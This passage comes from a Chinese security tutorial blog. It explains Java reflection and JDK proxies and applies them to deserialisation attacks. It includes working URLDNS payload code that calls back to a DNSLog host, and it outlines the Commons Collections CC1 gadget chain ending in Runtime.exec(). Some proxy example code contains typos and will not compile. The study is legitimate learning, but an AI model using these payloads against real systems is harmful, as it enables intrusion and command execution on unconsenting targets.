<p>，所以hashCode值已经不为-1了，</p>
<p>那么有没有办法可以把已经实例化的对象的值进行操作呢？在put操作完之后将hashCode的值改回-1，答案是有的，那就是反射：</p>
<h3 id="反射："><a href="#反射：" class="headerlink" title="反射："></a>反射：</h3><h4 id="获取原型以及生成对象-Class-Instance-："><a href="#获取原型以及生成对象-Class-Instance-：" class="headerlink" title="获取原型以及生成对象(Class,Instance)："></a>获取原型以及生成对象(Class,Instance)：</h4><p>Class类：反射就是通过操作Class类，从原型class中实例化对象，修改属性等等：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;potato&quot;</span>,<span class="hljs-number">19</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br><span class="hljs-comment">//c.newInstance();</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class,<span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) constructor.newInstance(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">18</span>);<br>System.out.println(p.toString());<br></code></pre></td></tr></table></figure>

<p>看以上代码：</p>
<p>先调用Person类构造器生成了一个person实例，属性值name为potato，age为19；</p>
<p>通过Class类下的getClass()方法来获取person对象的类的原型c；</p>
<p>此时如果像注释中直接调用newInstance()方法，那么默认是通过无参构造函数实例化对象的，但是显然，我们的Person类下的构造函数是有参的，这时就要使用Constructor类下的getConstructor()方法来构造有参实例了</p>
<p>查看getConstructor()方法的源码，参数是类泛型</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png"></p>
<p>然后将constructor对象调用newInstance()方法，来生成一个实例（返回Object对象），此时可以直接在newInstance()方法中传参。</p>
<p>或者：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Class c = Person.class;<br></code></pre></td></tr></table></figure>



<h4 id="属性-Field-："><a href="#属性-Field-：" class="headerlink" title="属性(Field)："></a>属性(Field)：</h4><h5 id="获取原型的属性："><a href="#获取原型的属性：" class="headerlink" title="获取原型的属性："></a>获取原型的属性：</h5><p><code>getField()</code>：从<strong>类原型</strong>中获取公有属性，返回一个Field类型对象</p>
<p><code>getFields()</code>：从<strong>类原型</strong>中获取公有属性们，返回一个Field类型对象数组</p>
<p><code>getDeclaredFiled()</code>：从<strong>类原型</strong>中获取任何属性，返回一个Field类型对象</p>
<p><code>getDeclaredFields()</code>：从<strong>类原型</strong>中获取任何属性们，返回一个Field类型对象数组</p>
<p>如当我的age属性是私有的，那么不使用declared就无法访问到，使用<code>getDeclaredFields()</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeTestApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;potato&quot;</span>,<span class="hljs-number">19</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) constructor.newInstance(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">18</span>);<br>        System.out.println(p.toString());<br>        Field[] fields = c.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (Field field: fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">&#123; name : &#x27;lff&#x27; ; age : 18 &#125;</span><br><span class="hljs-comment">public java.lang.String com.test.serializetest.Person.name</span><br><span class="hljs-comment">private int com.test.serializetest.Person.age//会将age也获取到</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>

<p>如果使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f);<br></code></pre></td></tr></table></figure>

<p>就会抛出异常信息：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png"></p>
<p>但是使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f);<br></code></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">private int com.test.serializetest.Person.age<br></code></pre></td></tr></table></figure>

<h5 id="获取对象属性值："><a href="#获取对象属性值：" class="headerlink" title="获取对象属性值："></a>获取对象属性值：</h5><p><code>Field.getName()</code>：获取<strong>Field类型</strong>对象的属性名，返回字符串类型对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Field[] fields = c.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field: fields)&#123;<br>    System.out.println(field.getName());<br>&#125;<br><span class="hljs-comment">/**输出</span><br><span class="hljs-comment">name</span><br><span class="hljs-comment">age</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure>

<p><code>Field.get(Object obj)</code>：从obj对象中获取field类型中名为***的属性的值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>

<h5 id="修改对象属性值："><a href="#修改对象属性值：" class="headerlink" title="修改对象属性值："></a>修改对象属性值：</h5><p><code>set(Object obj,&quot;new_value&quot;)</code>：将Field对象所映射属性在obj对象中对应的值改为”new_value”</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>System.out.println(f.get(p));<br>f.set(p,<span class="hljs-string">&quot;potato&quot;</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">lff<br>potato<br></code></pre></td></tr></table></figure>

<p>但是在修改私有属性age的值的时候会发现抛出了异常：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>System.out.println(f.get(p));<br>f.set(p,<span class="hljs-number">20</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png"></p>
<p>原因是无法修改私有属性的值(实操get()也不行，即无法获取私有属性的值)，但是反射赋予了我们极大的权限，可以修改属性的修饰符：</p>
<p><code>setAccessible(boolen)：</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>System.out.println(f.get(p));<br>f.set(p,<span class="hljs-number">20</span>);<br>System.out.println(f.get(p));<br></code></pre></td></tr></table></figure>

<p>给field对象调用该方法，修改其对应映射的属性的权限</p>
<h4 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h4><p><code>getMethod()</code>：</p>
<p><code>getMethods()</code>：</p>
<p><code>getDeclaredMethod()</code>：</p>
<p><code>getDeclaredMethods()</code>：</p>
<p>具体实现方法和属性的类似，以getMethod()为例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;toString&quot;</span>);<br>System.out.println(method.invoke(p));<br></code></pre></td></tr></table></figure>

<p><code>getDeclaredMethod()</code>方法从类原型中获取名为toString的类方法，返回一个Method类型的对象</p>
<p>Method对象的<code>invoke()</code>方法，是调用对象p中的<code>toString()</code>方法，即打印出个人信息，结果如下：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png"></p>
<p>但是如果是有参的方法的情况呢？</p>
<p>我们在Person类里新定义一个<code>eat()</code>方法：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png"></p>
<p>如此调用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;eating&quot;</span>);<br>method.invoke(p,<span class="hljs-string">&quot;apple&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>便出现了异常：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png"></p>
<p>实际上与构造器类Constructor类似的，我们在获取有参方法时要传入参数：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png"></p>
<p>修改为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;eating&quot;</span>, String.class);<br>method.invoke(p,<span class="hljs-string">&quot;apple&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>达到预期</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png"></p>
<p>接下来就开始利用反射调URLDNS链，使其达到预期用于检测反序列化漏洞的目的：</p>
<h3 id="利用反射调URLDNS链："><a href="#利用反射调URLDNS链：" class="headerlink" title="利用反射调URLDNS链："></a>利用反射调URLDNS链：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeTestApplication</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://665eab82.dnslog.store.&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodeField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCodeField.set(url,<span class="hljs-number">114514</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        hashCodeField.set(url,-<span class="hljs-number">1</span>);<br>        Serialize.Serialize(hashMap);<br><span class="hljs-comment">//        Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;);</span><br>    &#125;<br></code></pre></td></tr></table></figure>

<p>在put之前将hashCode的值通过反射改为任意-1外的值，导致在调用put()方法时无法调用<code>hashCode()</code>方法，避免了因为put造成的影响查看DNS接受的数据，在put()调用之后，将hashCode的值再改为-1，满足readObject()方法中调用hashCode()的条件，序列化过程未接受到数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">public class SerializeTestApplication &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        Unserialize.Unserialize(&quot;src/main/java/com/test/serializetest/file/data.dat&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>反序列化过程中，会调用HashMap中readObect()中的hashCode()，同名方法也就会调用URL类中的<code>hashCode()</code>方法，因为hashCode值为-1，所以会调用hashCode()方法</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png"></p>
<p>DNSLog接收到解析数据：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png"></p>
<p>做个断点调试，在此处下断点，进行反序列化，发现从文件中读取进行反序列化的过程中hashCode的值是-1：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png"></p>
<p>URLDNS链利用的是同名方法hashCode()，那如果想调用除了同名方法之外的方法呢？通过invoke()</p>
<p>如果是像Runtime这样的没办法序列化的类呢？利用Class类来创建对象 </p>
<h3 id="JDK代理："><a href="#JDK代理：" class="headerlink" title="JDK代理："></a>JDK代理：</h3><p>关于代理模式，<a target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/proxy.html#_2-%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86">这篇文章</a>讲的非常清楚了，稍微整理一下内容：</p>
<p>代理，同网络中代理服务器的概念类似的，是引入一个中间人(代理对象)来代替对真实对象的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。</p>
<h4 id="静态代理："><a href="#静态代理：" class="headerlink" title="静态代理："></a>静态代理：</h4><p>比如说，就以模拟代理服务器为例：</p>
<p>定义一个模拟网络连接的接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">NetConnector</span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(String ip)</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>模拟网络连接接口的实现类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">userConnect</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NetConnector</span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(String ip)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;you&#x27;ve connected to &quot;</span>+ip);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>创建代理类并实现网络连接的接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NetConnector</span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetConnector netConnector;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserProxy</span><span class="hljs-params">(NetConnector netConnector)</span>&#123;<br>        <span class="hljs-built_in">this</span>.netConnector = netConnector;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(String ip)</span>&#123;<br>        Systrm.out.println(<span class="hljs-string">&quot;Before connect()&quot;</span>);<br>        netConnector.connect(ip);<br>        Systrm.out.println(<span class="hljs-string">&quot;After connect()&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>主函数实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>		<span class="hljs-type">NetConnector</span> <span class="hljs-variable">netConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetConnector</span>();<br>        <span class="hljs-type">UserProxy</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxy</span>(netConnector);<br>        userProxy.connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>执行后输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Before connect()<br>you&#x27;ve connected to 127.0.0.1<br>After connect()<br></code></pre></td></tr></table></figure>

<p>静态代理存在非常大的缺陷，即如果接口一旦修改或者新增方法，目标对象和代理对象都要修改，非常麻烦。并且实现起来不够灵活，需要被代理和代理类都实现一遍接口，当然实现类要写很多方法是必然的，但是代理的时候要写很多就很麻烦了。静态代理是在编译时就将接口，目标类和代理类全都编译成了一个个class文件</p>
<h4 id="动态代理："><a href="#动态代理：" class="headerlink" title="动态代理："></a>动态代理：</h4><p>动态代理技术主要运用的是java中Proxy类下的 <code>newProxyInstanc()</code>方法，方法源代码如下：</p>
<p>其参数列表：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png"></p>
<p>第一个参数是一个类加载器，java中基本上所有类的类加载器都相同；第二个是要代理的接口，可以传入多个，但是一般就一个，第三个参数是InvocationHandler类型的对象，下面会对InvocationHandler进行讲解</p>
<p>定义接口IUser：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>实现类UserImpl：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;show&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;create&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;update&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>写一个类来实现InvocationHandler接口，该接口仅一个方法invoke()，需要重写：</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png"></p>
<p>重写的时候最主要的参数就是method，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>   <span class="hljs-keyword">private</span> IUser user;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">(IUser user)</span>&#123;<br>       <span class="hljs-built_in">this</span>.user = user;<br>   &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        method.invoke(user,args);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>动态代理类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserImpl</span>();<br>        <span class="hljs-comment">//动态代理</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">userInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInvocationHandler</span>(user);<br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userInvocationHandler);<br>        userProxy.show();<br>        userProxy.create();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上面已经知道了 <code>newProxyInstanc()</code>方法返回Object类型，因此要转型成IUser接口类型</p>
<p>在反序列化漏洞中的利用：</p>
<h3 id="Common-Collections："><a href="#Common-Collections：" class="headerlink" title="Common Collections："></a>Common Collections：</h3><h4 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/*<br>	Gadget chain:<br>		ObjectInputStream.readObject()<br>			AnnotationInvocationHandler.readObject()<br>				Map(Proxy).entrySet()<br>					AnnotationInvocationHandler.invoke()<br>						LazyMap.get()<br>							ChainedTransformer.transform()<br>								ConstantTransformer.transform()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Class.getMethod()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.getRuntime()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.exec()<br> */<br></code></pre></td></tr></table></figure>

<p>环境Common Collections&lt;&#x3D;3.2.1：</p>
